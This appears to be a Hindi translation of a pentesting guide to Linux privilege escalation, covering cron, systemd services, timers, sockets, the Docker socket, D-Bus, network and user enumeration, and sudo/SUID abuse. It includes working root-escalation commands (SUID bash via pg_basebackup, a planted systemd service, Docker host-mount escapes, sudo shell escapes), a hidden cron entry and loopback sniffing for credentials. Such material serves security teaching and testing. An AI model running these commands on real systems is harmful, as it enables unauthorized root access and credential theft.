अगर कोई सामान्य user उस exact binary को लिख सकता है जिसे root cron job चलाता है, तो वह privilege boundary पार कर सकता है; लेकिन custom signature check unsigned replacement को अस्वीकार कर सकता है। दर्ज मामले में, root-owned ELF का mode `0760` था, जिससे उसके group का सदस्य उसे लिख सकता था, जबकि root owner उसे execute कर सकता था। एक दिखाई देने वाले process trace से पता चला कि job द्वारा binary चलाए जाने से पहले `objcopy` `.text_sig` extract कर रहा था; verifier script पूरी तरह पढ़ने योग्य नहीं थी।<sup>[[2]](#references)</sup>

सफल replacement पर ELF signer का उपयोग करके leaked private signing material से signature किया गया था। इसकी [format documentation](https://github.com/NUAA-WatchDog/linux-elf-binary-signer) executable के `.text` से बने signature section का वर्णन करती है। केवल `.text_sig` में certificate या matching string जोड़ने से अज्ञात verifier संतुष्ट होता है—ऐसा नहीं दिखाया गया है। यह निष्कर्ष निकालने से पहले कि writable signed binary का exploit किया जा सकता है, वास्तविक scheduled path, effective write access, root invocation और verifier policy जाँचें। केवल `.text_sig` section होना, समीक्षा के लिए एक संकेत है।

### बार-बार चलने वाले cron jobs

हर 1, 2 या 5 मिनट में execute होने वाली processes खोजने के लिए आप processes को monitor कर सकते हैं। शायद आप इसका फायदा उठाकर privileges escalate कर सकें।

उदाहरण के लिए, **1 मिनट तक हर 0.1s पर monitor करने**, **सबसे कम execute हुए commands को sort करने** और सबसे अधिक बार execute हुए commands को delete करने के लिए, आप यह कर सकते हैं:

```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```

**आप [**pspy**](https://github.com/DominicBreuker/pspy/releases) का भी उपयोग कर सकते हैं** (यह शुरू होने वाली हर process को monitor और list करेगा).

### ऐसे Root backups जो attacker द्वारा सेट किए गए mode bits को preserve करते हैं (pg_basebackup)

अगर कोई root-owned cron, ऐसी database directory पर `pg_basebackup` (या कोई recursive copy) चलाता है जिस पर आप लिख सकते हैं, तो आप एक **SUID/SGID binary** रख सकते हैं, जिसे backup output में उन्हीं mode bits के साथ **root:root** के रूप में दोबारा copy किया जाएगा.<sup>[[26]](#references)</sup>

एक सामान्य discovery flow (कम privileges वाले DB user के रूप में):
- `pspy` का उपयोग करके ऐसा root cron देखें जो हर मिनट `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` जैसा command चलाता हो।
- पुष्टि करें कि source cluster (जैसे, `/var/lib/postgresql/14/main`) पर आप लिख सकते हैं और job चलने के बाद destination (`/opt/backups/current`) का owner root हो जाता है।

Exploit:

```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```

यह इसलिए काम करता है क्योंकि `pg_basebackup` क्लस्टर की कॉपी बनाते समय फ़ाइल के mode bits को सुरक्षित रखता है; root द्वारा चलाए जाने पर destination files को **root ownership + attacker-chosen SUID/SGID** मिलता है। ऐसा कोई भी समान privileged backup/copy routine जो permissions सुरक्षित रखता है और किसी executable location में लिखता है, vulnerable है।

### अदृश्य cron jobs

एक cronjob बनाना संभव है **जिसमें comment के बाद carriage return हो** (बिना newline character के), और cron job काम करेगी। उदाहरण (carriage return char पर ध्यान दें):

```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```

इस तरह की stealth entry का पता लगाने के लिए, ऐसे tools से cron files की जांच करें जो control characters दिखाते हैं:

```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```

## सेवाएँ

### लिखने योग्य _.service_ फ़ाइलें

जाँचें कि क्या आप किसी `.service` फ़ाइल में लिख सकते हैं। अगर हाँ, तो आप उसे संशोधित कर सकते हैं, ताकि service शुरू, पुनः शुरू या बंद होने पर आपका backdoor **चलाया जाए** (शायद आपको मशीन के रीबूट होने तक इंतज़ार करना पड़े)।\
उदाहरण के लिए, `.service` फ़ाइल के अंदर अपना backdoor बनाएँ: **`ExecStart=/tmp/script.sh`**

### लिखने योग्य service binaries

ध्यान रखें कि अगर आपके पास services द्वारा चलाए जा रहे binaries पर **लिखने की अनुमति** है, तो आप उन्हें backdoors से बदल सकते हैं, ताकि services के दोबारा चलाए जाने पर backdoors चलें।

### systemd PATH - सापेक्ष पथ

आप यह देख सकते हैं कि **systemd** कौन-सा PATH इस्तेमाल करता है:

```bash
systemctl show-environment
```

यदि आपको पता चलता है कि आप path के किसी भी फ़ोल्डर में **लिख** सकते हैं, तो संभव है कि आप **escalate privileges** कर सकें। आपको service configuration फ़ाइलों में इस्तेमाल किए जा रहे **relative paths** खोजने होंगे, जैसे:

```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```

फिर, उस systemd PATH folder के अंदर **relative path binary** के **समान नाम वाला एक executable** बनाएं जिसमें आप लिख सकते हैं। जब service से vulnerable action (**Start**, **Stop**, **Reload**) execute करने को कहा जाएगा, तो आपका **backdoor execute होगा** (आमतौर पर unprivileged users services को start/stop नहीं कर सकते, लेकिन जांचें कि क्या आप `sudo -l` का उपयोग कर सकते हैं)।

**`man systemd.service` से services के बारे में और जानें।**

## **Timers**

**Timers** ऐसी systemd unit files हैं जिनके नाम `**.timer**` से समाप्त होते हैं और जो `**.service**` files या events को नियंत्रित करती हैं। **Timers** को cron के विकल्प के रूप में इस्तेमाल किया जा सकता है, क्योंकि इनमें calendar time events और monotonic time events के लिए built-in support होता है और इन्हें asynchronous रूप से चलाया जा सकता है।

आप सभी timers की enumeration इस तरह कर सकते हैं:

```bash
systemctl list-timers --all
```

### लिखने योग्य timers

यदि आप किसी timer को संशोधित कर सकते हैं, तो आप उससे systemd.unit की कुछ इकाइयाँ (जैसे `.service` या `.target`) execute करवा सकते हैं।

```bash
Unit=backdoor.service
```

दस्तावेज़ में आप पढ़ सकते हैं कि Unit क्या है:

> इस timer के समाप्त होने पर सक्रिय की जाने वाली unit। यह argument एक unit name है, जिसका suffix ".timer" नहीं होता। यदि निर्दिष्ट न किया जाए, तो यह मान डिफ़ॉल्ट रूप से उस service पर सेट होता है जिसका नाम timer unit के समान होता है, suffix को छोड़कर। (ऊपर देखें।) यह अनुशंसा की जाती है कि सक्रिय की जाने वाली unit और timer unit के नाम suffix को छोड़कर एक जैसे हों।

इसलिए, इस permission का दुरुपयोग करने के लिए आपको यह करना होगा:

- ऐसी systemd unit (जैसे `.service`) ढूँढें जो **writable binary चला रही हो**
- ऐसी systemd unit ढूँढें जो **relative path चला रही हो**, और आपके पास **systemd PATH** पर **लिखने के विशेषाधिकार** हों (ताकि उस executable का रूप धारण कर सकें)

**`man systemd.timer` के साथ timers के बारे में और जानें।**

### **Timer सक्षम करना**

Timer सक्षम करने के लिए आपको root privileges और यह command चलाने की आवश्यकता है:

```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```

ध्यान दें कि **timer** को `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` पर symlink बनाकर **activate** किया जाता है।

## Sockets

Unix Domain Sockets (UDS), client-server models के भीतर एक ही या अलग-अलग मशीनों पर **process communication** सक्षम करते हैं। ये कंप्यूटरों के बीच संचार के लिए standard Unix descriptor files का उपयोग करते हैं और `.socket` files के ज़रिए सेट अप किए जाते हैं।<sup>[[14]](#references)</sup>

Sockets को `.socket` files का उपयोग करके configure किया जा सकता है।

**`man systemd.socket` से sockets के बारे में और जानें।** इस file के भीतर, कई दिलचस्प parameters configure किए जा सकते हैं:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: ये options अलग-अलग हैं, लेकिन संक्षेप में इनका उपयोग यह **बताने के लिए किया जाता है कि socket कहाँ listen करेगा** (AF_UNIX socket file का path, listen करने के लिए IPv4/6 और/या port number, आदि)।
- `Accept`: Boolean argument लेता है। यदि **true** है, तो हर incoming connection के लिए एक **service instance शुरू किया जाता है** और उसे केवल connection socket दिया जाता है। यदि **false** है, तो सभी listening sockets स्वयं **शुरू की गई service unit को दिए जाते हैं**, और सभी connections के लिए केवल एक service unit शुरू की जाती है। Datagram sockets और FIFOs के लिए इस value को अनदेखा किया जाता है, जहाँ एक ही service unit बिना किसी शर्त के आने वाले सभी traffic को संभालती है। **डिफ़ॉल्ट false है**। Performance के कारणों से, नए daemons को केवल ऐसे तरीके से लिखने की सलाह दी जाती है जो `Accept=no` के अनुकूल हो।
- `ExecStartPre`, `ExecStartPost`: एक या अधिक command lines लेते हैं, जिन्हें listening **sockets**/FIFOs के **बनाए और bind किए जाने से पहले** या **बाद में** execute किया जाता है। Command line का पहला token एक absolute filename होना चाहिए, जिसके बाद process के लिए arguments दिए जाते हैं।
- `ExecStopPre`, `ExecStopPost`: अतिरिक्त **commands**, जिन्हें listening **sockets**/FIFOs के **बंद और हटाए जाने से पहले** या **बाद में** execute किया जाता है।
- `Service`: incoming traffic पर **activate** करने के लिए **service** unit का नाम बताता है। यह setting केवल Accept=no वाले sockets के लिए अनुमत है। डिफ़ॉल्ट रूप से यह उसी नाम वाली service को चुनता है जो socket का नाम है (suffix बदलकर)। अधिकांश मामलों में, इस option का उपयोग आवश्यक नहीं होना चाहिए।

### Writable .socket files

यदि आपको कोई **writable** `.socket` file मिलती है, तो आप `[Socket]` section की शुरुआत में कुछ ऐसा **जोड़** सकते हैं: `ExecStartPre=/home/kali/sys/backdoor`, और socket बनने से पहले backdoor execute हो जाएगा। इसलिए, आपको **संभवतः मशीन के reboot होने तक इंतज़ार करना होगा।**\
_ध्यान दें कि system में उस socket file configuration का उपयोग होना चाहिए, वरना backdoor execute नहीं होगा_

### Socket activation + writable unit path (create missing service)

एक और high-impact misconfiguration यह है:

- `Accept=no` और `Service=<name>.service` वाली socket unit
- संदर्भित service unit मौजूद नहीं है
- कोई attacker `/etc/systemd/system` (या किसी अन्य unit search path) में लिख सकता है

ऐसी स्थिति में, attacker `<name>.service` बना सकता है, फिर socket पर traffic भेज सकता है, जिससे systemd नई service को root के रूप में load और execute करे।

संक्षिप्त flow:

```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```

### Writable sockets

अगर आप **किसी writable socket की पहचान करते हैं** (_यहाँ हम Unix Sockets की बात कर रहे हैं, config `.socket` files की नहीं_), तो **आप उस socket से communicate कर सकते हैं** और शायद किसी vulnerability का exploit कर सकते हैं।

### Enumerate Unix Sockets

```bash
netstat -a -p --unix
```

### रॉ कनेक्शन

```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```

**Exploitation उदाहरण:**


{{#ref}}
../../network-information/socket-command-injection.md
{{#endref}}

### HTTP sockets

ध्यान दें कि HTTP requests के लिए कुछ **sockets सुन रहे हो सकते हैं** (_मेरा मतलब .socket files से नहीं है, बल्कि उन files से है जो unix sockets की तरह काम करती हैं_)। आप इसे इस तरह जांच सकते हैं:

```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```

यदि socket किसी **HTTP** request का जवाब देता है, तो आप उससे **communicate** कर सकते हैं और शायद **किसी vulnerability का exploit** कर सकते हैं।

### Writable Docker Socket

Docker socket, जो अक्सर `/var/run/docker.sock` पर मिलता है, एक महत्वपूर्ण फ़ाइल है जिसे सुरक्षित रखा जाना चाहिए। डिफ़ॉल्ट रूप से, इस पर `root` user और `docker` group के सदस्यों को write access होता है। इस socket पर write access मिलने से privilege escalation हो सकता है। नीचे बताया गया है कि यह कैसे किया जा सकता है और Docker CLI उपलब्ध न होने पर कौन-से वैकल्पिक तरीके अपनाए जा सकते हैं।

#### **Docker CLI के साथ Privilege Escalation**

यदि आपके पास Docker socket पर write access है, तो आप निम्नलिखित commands का उपयोग करके privileges बढ़ा सकते हैं:<sup>[[15]](#references)</sup>

```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```

ये commands आपको host के file system पर root-level access के साथ container चलाने देते हैं।

#### **Docker API Directly का उपयोग करना**

ऐसे मामलों में जहाँ Docker CLI उपलब्ध नहीं है, Docker socket का raw HTTP over the Unix socket के ज़रिए अब भी दुरुपयोग किया जा सकता है। सबसे भरोसेमंद तरीका है:

- host root को bind-mount करके एक long-lived helper container बनाना
- उसे start करना
- उस helper के भीतर एक `exec` instance बनाना
- `exec` instance को start करना और API के ज़रिए उसका output वापस पढ़ना

**Docker images की सूची बनाएँ**

```bash
curl --unix-socket /var/run/docker.sock http://localhost/images/json
```

**एक helper container बनाएँ और शुरू करें**

```bash
HELPER=helper

curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine:3.20","Cmd":["sleep","99999"],"HostConfig":{"Binds":["/:/host"]}}' \
  "http://localhost/v1.47/containers/create?name=${HELPER}"

curl --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/v1.47/containers/${HELPER}/start"
```

**एक exec instance बनाएँ**

```bash
EXEC_ID=$(
  curl -s --unix-socket /var/run/docker.sock \
    -H "Content-Type: application/json" \
    -d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["sh","-lc","find /host/root -maxdepth 1 -type f"]}' \
    "http://localhost/v1.47/containers/${HELPER}/exec" \
  | tr -d '\n' \
  | sed -n 's/.*"Id":"\([^"]*\)".*/\1/p'
)
```

**exec instance शुरू करें और आउटपुट पढ़ें**

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Detach":false,"Tty":true}' \
  "http://localhost/v1.47/exec/${EXEC_ID}/start"
```

यह pattern आमतौर पर `socat` या `nc -U` के साथ मैन्युअल रूप से `attach` चलाने की कोशिश करने से अधिक robust होता है। एक बार जब आप `/:/host` के साथ helper बना सकते हैं, तो आप `/host/root/...` जैसी files पढ़ने, `/host/root/.ssh` में SSH keys जोड़ने या host startup files में बदलाव करने के लिए अतिरिक्त `exec` instances का उपयोग कर सकते हैं।

### अन्य

ध्यान दें कि अगर आपके पास **`docker` group के अंदर होने** के कारण docker socket पर write permissions हैं, तो आपके पास [**privileges escalate करने के और तरीके**](../../user-information/interesting-groups-linux-pe/index.html#docker-group) हैं। अगर [**docker API किसी port पर listening है**, तो आप उसे compromise भी कर सकते हैं](../../../network-services-pentesting/2375-pentesting-docker.md#compromising)।

**Containers से बाहर निकलने या privileges escalate करने के लिए container runtimes का दुरुपयोग करने के और तरीके** यहाँ देखें:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Containerd (ctr) privilege escalation

अगर आपको पता चलता है कि आप **`ctr`** command का उपयोग कर सकते हैं, तो अगला page पढ़ें, क्योंकि **आप privileges escalate करने के लिए इसका दुरुपयोग कर सकते हैं**:


{{#ref}}
../../containers-namespaces/containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

अगर आपको पता चलता है कि आप **`runc`** command का उपयोग कर सकते हैं, तो अगला page पढ़ें, क्योंकि **आप privileges escalate करने के लिए इसका दुरुपयोग कर सकते हैं**:


{{#ref}}
../../containers-namespaces/runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus एक परिष्कृत **inter-Process Communication (IPC) system** है, जो applications को कुशलतापूर्वक आपस में interact करने और data साझा करने में सक्षम बनाता है। आधुनिक Linux system को ध्यान में रखकर डिज़ाइन किया गया यह system, applications के बीच संचार के विभिन्न रूपों के लिए एक robust framework प्रदान करता है।<sup>[[16]](#references)</sup>

यह system versatile है और data exchange को बेहतर बनाने वाले basic IPC का समर्थन करता है, जो **enhanced UNIX domain sockets** की याद दिलाता है। इसके अलावा, यह events या signals broadcast करने में मदद करता है, जिससे system components के बीच सहज integration संभव होता है। उदाहरण के लिए, आने वाली call के बारे में Bluetooth daemon का signal music player को mute करने के लिए प्रेरित कर सकता है, जिससे user experience बेहतर होता है। इसके अतिरिक्त, D-Bus remote object system का समर्थन करता है, जो applications के बीच service requests और method invocations को आसान बनाकर उन processes को सुव्यवस्थित करता है जो पहले जटिल थे।

D-Bus एक **allow/deny model** पर काम करता है। यह matching policy rules के संयुक्त प्रभाव के आधार पर message permissions (method calls, signal emissions, आदि) का प्रबंधन करता है। ये policies bus के साथ होने वाले interactions को निर्दिष्ट करती हैं और इन permissions का दुरुपयोग करके privilege escalation संभव बना सकती हैं।

ऐसी policy का एक उदाहरण `/etc/dbus-1/system.d/wpa_supplicant.conf` में दिया गया है। इसमें root user के लिए `fi.w1.wpa_supplicant1` का मालिक बनने, उसे messages भेजने और उससे messages प्राप्त करने की permissions का विवरण है।

किसी user या group को निर्दिष्ट न करने वाली policies सभी पर लागू होती हैं, जबकि "default" context policies उन सभी पर लागू होती हैं जो अन्य विशिष्ट policies के अंतर्गत नहीं आते।

```xml
<policy user="root">
    <allow own="fi.w1.wpa_supplicant1"/>
    <allow send_destination="fi.w1.wpa_supplicant1"/>
    <allow send_interface="fi.w1.wpa_supplicant1"/>
    <allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```

**यहाँ D-Bus communication को enumerate और exploit करना सीखें:**


{{#ref}}
../../processes-crontab-systemd-dbus/d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **नेटवर्क**

नेटवर्क को enumerate करके मशीन की स्थिति का पता लगाना हमेशा दिलचस्प होता है।

### सामान्य enumeration

```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```

यदि कोई सक्रिय `/etc/inetd.conf` entry GNU Inetutils `telnetd` को root के रूप में चलाती है, तो configured binary version और local listener की जाँच करें, भले ही port केवल loopback पर bound हो। GNU Inetutils 1.9.3 से 2.7 तक में एक [telnet authentication bypass](https://seclists.org/oss-sec/2026/q1/89) था, जिसमें client द्वारा दिया गया `USER`, `login -f` तक पहुँचता था (CVE-2026-24061)। कोई process या version string एक संकेत है; इसे exposed मानने से पहले vendor patch status और वास्तविक daemon की पुष्टि करें। [Telnet guide](../../../network-services-pentesting/pentesting-telnet.md) में अधिक जानकारी है।

### Outbound filtering की त्वरित जाँच

यदि host commands चला सकता है, लेकिन callbacks विफल होते हैं, तो DNS, transport, proxy और route filtering की जल्दी से अलग-अलग जाँच करें:

```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```

### खुले पोर्ट

मशीन को एक्सेस करने से पहले, उस पर चल रही उन नेटवर्क सेवाओं की हमेशा जाँच करें जिनसे आप पहले इंटरैक्ट नहीं कर पाए थे:

```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```

Bind target के आधार पर listeners को वर्गीकृत करें:

- `0.0.0.0` / `[::]`: सभी स्थानीय interfaces पर exposed।
- `127.0.0.1` / `::1`: केवल local (अच्छे tunnel/forward candidates)।
- विशिष्ट internal IPs (जैसे `10.x`, `172.16/12`, `192.168.x`, `fe80::`): आमतौर पर केवल internal segments से reachable।

### केवल local services की triage workflow

जब आप किसी host को compromise करते हैं, तो `127.0.0.1` पर bound services अक्सर पहली बार आपके shell से reachable हो जाती हैं। एक त्वरित local workflow यह है:

```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```

### LinPEAS एक network scanner के रूप में (network-only mode)

Local PE checks के अलावा, linPEAS एक केंद्रित network scanner के रूप में चल सकता है। यह `$PATH` में उपलब्ध binaries (आमतौर पर `fping`, `ping`, `nc`, `ncat`) का उपयोग करता है और कोई tooling install नहीं करता।

```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```

यदि आप `-t` के बिना `-d`, `-p`, या `-i` पास करते हैं, तो linPEAS एक pure network scanner की तरह काम करता है (privilege-escalation की बाकी जाँचें छोड़ देता है)।

### Sniffing

जाँचें कि क्या आप traffic sniff कर सकते हैं। यदि कर सकते हैं, तो आप कुछ credentials हासिल कर सकते हैं।

```
timeout 1 tcpdump
```

त्वरित व्यावहारिक जाँच:

```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```

Loopback (`lo`) post-exploitation में खास तौर पर मूल्यवान है, क्योंकि कई केवल-आंतरिक सेवाएँ वहाँ tokens/cookies/credentials उजागर करती हैं:

```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
  | egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```

अभी capture करें, बाद में parse करें:

```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
  -T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```

## उपयोगकर्ता

### Generic Enumeration

जांचें कि आप **कौन** हैं, आपके पास कौन से **privileges** हैं, systems में कौन से **users** हैं, कौन **login** कर सकते हैं और किनके पास **root privileges** हैं:

```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```

### बड़ा UID

Linux के कुछ versions एक bug से प्रभावित थे, जो **UID > INT_MAX** वाले users को privileges escalate करने देता है। अधिक जानकारी: [यहाँ](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [यहाँ](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) और [यहाँ](https://twitter.com/paragonsec/status/1071152249529884674)।<sup>[[33]](#references)[[34]](#references)[[35]](#references)</sup>\
इसे **`systemd-run -t /bin/bash`** का उपयोग करके **exploit करें**।

### समूह

जाँचें कि क्या आप **किसी ऐसे group के member हैं** जो आपको root privileges दे सकता है:


{{#ref}}
../../user-information/interesting-groups-linux-pe/
{{#endref}}

### क्लिपबोर्ड

जाँचें कि क्या क्लिपबोर्ड में कुछ दिलचस्प है (यदि संभव हो)

```bash
if [ `which xclip 2>/dev/null` ]; then
    echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
    echo "Highlighted text: "`xclip -o 2>/dev/null`
  elif [ `which xsel 2>/dev/null` ]; then
    echo "Clipboard: "`xsel -ob 2>/dev/null`
    echo "Highlighted text: "`xsel -o 2>/dev/null`
  else echo "Not found xsel and xclip"
  fi
```

### पासवर्ड नीति

```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```

### ज्ञात पासवर्ड

अगर आपको environment का **कोई भी पासवर्ड पता है**, तो उस पासवर्ड का इस्तेमाल करके **हर user के रूप में login करने की कोशिश करें**।

### Su Brute

अगर आपको ज़्यादा शोर करने से फर्क नहीं पड़ता और कंप्यूटर पर `su` तथा `timeout` binaries मौजूद हैं, तो [su-bruteforce](https://github.com/carlospolop/su-bruteforce) का इस्तेमाल करके user को brute-force करने की कोशिश कर सकते हैं।\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) `-a` parameter के साथ users को brute-force करने की कोशिश भी करता है।

## Writable PATH का दुरुपयोग

### $PATH

अगर आपको पता चलता है कि आप **$PATH के किसी folder में लिख सकते हैं**, तो आप writable folder में किसी ऐसे command के नाम से **backdoor बना कर privileges escalate** कर सकते हैं, जिसे कोई दूसरा user (आदर्श रूप से root) चलाने वाला हो और जो $PATH में आपके writable folder से पहले मौजूद किसी folder से **load न हो**।

### SUDO और SUID

आपको sudo का इस्तेमाल करके कोई command चलाने की अनुमति हो सकती है या उस पर suid bit सेट हो सकता है। इसे इस तरह जाँचें:

```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```

कुछ **अप्रत्याशित commands आपको फ़ाइलें पढ़ने और/या लिखने, या यहाँ तक कि कोई command execute करने की अनुमति देते हैं**।<sup>[[8]](#references)</sup> उदाहरण के लिए:

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```

### NOPASSWD

Sudo कॉन्फ़िगरेशन किसी यूज़र को पासवर्ड जाने बिना दूसरे यूज़र के विशेषाधिकारों के साथ कुछ कमांड चलाने की अनुमति दे सकता है।

```
$ sudo -l
User demo may run the following commands on crashlab:
    (root) NOPASSWD: /usr/bin/vim
```

इस उदाहरण में उपयोगकर्ता demo, root के रूप में vim चला सकता है। अब root directory में ssh key जोड़कर या sh चलाकर shell प्राप्त करना आसान है।

```
sudo vim -c '!sh'
```

### sudo script में unquoted Bash comparison

Bash में, `[[ "$protected" == $candidate ]]` का दायाँ पक्ष एक pattern होता है। यदि root-capable sudo script, `candidate` को caller द्वारा नियंत्रित फ़ाइल से भरती है, तो `prefix*` जैसी value किसी protected string की शुरुआत से match कर सकती है। सफलता और error के अलग-अलग paths तब prefix oracle उजागर कर सकते हैं। जहाँ literal equality का इरादा हो, वहाँ दाएँ पक्ष को quote करें (`[[ "$protected" == "$candidate" ]]`)। किसी unquoted comparison को exploitable मानने से पहले, sudo के वास्तविक arguments, input का स्रोत और दिखाई देने वाला branch behavior जाँचें। [GNU Bash manual](https://www.gnu.org/software/bash/manual/html_node/Conditional-Constructs.html) इस pattern behavior को परिभाषित करता है।

### sudo के अंतर्गत PrusaSlicer project files

